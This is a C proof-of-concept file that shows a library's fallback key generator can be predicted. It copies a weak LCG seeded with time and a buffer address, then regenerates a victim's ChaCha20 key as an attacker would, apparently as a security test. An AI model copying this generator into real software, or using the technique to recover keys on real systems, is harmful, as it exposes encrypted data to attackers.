/**
 * @file poc_weak_key_generation.c
 * @brief Proof-of-concept for predictable key generation.
 *
 * This PoC demonstrates that the fallback PRNG in rp_crypto_generate_key
 * is predictable. An attacker who can predict the seed (time + address)
 * can regenerate the "secret" key.
 */

#include "rampart.h"
#include "internal/rp_crypto.h"
#include <stdio.h>
#include <string.h>
#include <time.h>

/*
 * This is a copy of the weak PRNG fallback from src/rp_crypto.c.
 * It is included here to create a deterministic test case.
 */
static rampart_error_t vulnerable_generate_key(unsigned char *key, size_t key_len, time_t seed_time, void* seed_ptr) {
    size_t i;
    unsigned long state;

    if (key == NULL) {
        return RAMPART_ERR_NULL_PARAM;
    }
    if (key_len != RP_CHACHA20_KEY_SIZE) {
        return RAMPART_ERR_INVALID_SIZE;
    }

    state = (unsigned long)(size_t)seed_ptr ^ (unsigned long)seed_time;
    /* In the original code, clock() is also used. We omit it here for a simpler PoC,
       as time() and the pointer are often predictable enough. */

    for (i = 0; i < key_len; i++) {
        state = state * 6364136223846793005UL + 1442695040888963407UL;
        key[i] = (unsigned char)((state >> 32) & 0xFF);
    }

    return RAMPART_OK;
}

void print_key(const char* label, const unsigned char* key, size_t len) {
    size_t i;
    printf("%s: ", label);
    for (i = 0; i < len; i++) {
        printf("%02x", key[i]);
    }
    printf("\n");
}

int main() {
    unsigned char secret_key[RP_CHACHA20_KEY_SIZE];
    unsigned char attacker_key[RP_CHACHA20_KEY_SIZE];
    time_t prediction_time;

    printf("PoC: Weak Key Generation\n");
    printf("-------------------------\n");

    // 1. Victim generates a key.
    // We capture the time, which an attacker might be able to predict.
    prediction_time = time(NULL);
    vulnerable_generate_key(secret_key, sizeof(secret_key), prediction_time, secret_key);
    print_key("Victim's 'secret' key", secret_key, sizeof(secret_key));

    // 2. Attacker regenerates the key.
    // The attacker predicts the time and knows the generation algorithm.
    // The address of the buffer is also used as a seed component. While this
    // is not always known to a remote attacker, it can be predictable in
    // many scenarios (e.g., known executable, ASLR bypass). For this PoC,
    // we assume the attacker can replicate the conditions.
    printf("\nAttacker is attempting to regenerate the key...\n");
    printf("Attacker's prediction for time: %ld\n", (long)prediction_time);
    printf("Attacker's prediction for key address: %p\n", (void*)secret_key);

    vulnerable_generate_key(attacker_key, sizeof(attacker_key), prediction_time, secret_key);
    print_key("Attacker's generated key", attacker_key, sizeof(attacker_key));

    // 3. Compare the keys.
    if (memcmp(secret_key, attacker_key, sizeof(secret_key)) == 0) {
        printf("\nSUCCESS: Attacker successfully regenerated the secret key.\n");
        return 1; // Return non-zero for failure in test scripts
    } else {
        printf("\nFAILURE: Attacker could not regenerate the secret key.\n");
        return 0;
    }
}
